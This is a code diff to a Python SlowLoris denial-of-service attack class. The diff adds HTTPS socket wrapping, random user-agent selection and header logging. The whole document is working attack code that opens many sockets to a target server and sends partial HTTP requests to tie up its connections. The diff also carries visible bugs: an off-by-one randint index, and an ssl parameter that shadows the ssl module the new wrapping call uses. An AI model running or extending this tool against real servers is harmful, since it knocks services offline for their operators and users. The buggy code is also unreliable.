@@ -42,7 +42,7 @@ class SlowLoris:
         'Accept-Language: en-US,en;q=0.5'
     ]
 
-    def __init__(self, target, sock_count, thread_count=1, random_agent=False):
+    def __init__(self, target, sock_count, thread_count=1, random_agent=False, ssl=False):
         '''
         A SlowLoris attack class which handles creation and management of sockets with thread pool feature
         Arguments:
@@ -55,7 +55,8 @@ class SlowLoris:
 
         # randomizing user agent
         if random_agent is True:
-            headers[0] = 'User-Agent: {}'.format(user_agents[randint(0, len(user_agents))])
+            logger.info('Selecting a random user agent...')
+            self.headers[0] = 'User-Agent: {}'.format(self.user_agents[randint(0, len(user_agents))])
 
         logger.info('Attacking {} with {} sockets'.format(target[0], sock_count))
         self._sock_count = sock_count
@@ -63,6 +64,13 @@ class SlowLoris:
 
         logger.info('Creating a thread pool of {} threads'.format(thread_count))
         self.pool = ThreadPool(thread_count)
+
+        # Logging headers for debugging purposes
+        logger.debug('Using headers:')
+        for header in self.headers:
+            logger.debug(header)
+
+        self.ssl = ssl
 
     def connect_sockets(self):
         '''
@@ -78,7 +86,7 @@ class SlowLoris:
         if len(self.sockets) != self._sock_count:
             raise Exception('Unable to create {} sockets!'.format(self._sock_count))
 
-    def init_socket(self, ssl=False):
+    def init_socket(self):
         '''
         Creates a single socket to the target and stores the socket in the `sockets` list to be managed later
         '''
@@ -87,6 +95,11 @@ class SlowLoris:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(4)
             sock.connect(self.target)
+
+            # Wraps the socket for https
+            if self.ssl is True:
+                logger.debug('SSL wrapping socket')
+                sock = ssl.wrap_socket(sock)
 
             # Send the headers of the HTTP request
             sock.send('GET /?{} HTTP/1.1\r\n'.format(randint(0, 50000)).encode('utf-8'))
